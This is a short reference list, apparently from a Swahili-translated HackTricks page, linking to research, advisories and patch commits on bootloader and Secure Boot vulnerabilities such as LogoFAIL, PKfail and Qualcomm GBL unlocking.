+- [2] [Kugundua LogoFAIL: Hatari za kuchanganua picha wakati wa kuwasha mfumo](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
+- [3] [PKfail: Vifunguo vya Jukwaa Visivyoaminika Vinadhoofisha Secure Boot katika Mfumo wa UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
+- [4] [Maelezo ya CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
+- [5] [Kuzuiwa: Kufungua Xiaomi kupitia mifuatano miwili isiyosafishwa](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
+- [6] [Exploit ya Qualcomm Snapdragon 8 Elite GBL inawaruhusu washambuliaji kufungua bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
+- [7] [Usanifu wa Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
+- [8] [QcomModulePkg: Rekebisha uenezaji wa ingizo lisiloaminika kwenye kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
+- [9] [QcomModulePkg: ongeza ukaguzi wa amri ya set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
+- [10] [Haiwezi kuwasha: kuvunja uthibitishaji wa sahihi za FIT wa U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
+- [11] [Notisi ya Udhaifu VU#616257 - Bootloader za UEFI shim zilizosainiwa na Microsoft ziko hatarini kukwepa Secure Boot](https://kb.cert.org/vuls/id/616257)
 {{#include ../../banners/hacktricks-training.md}}
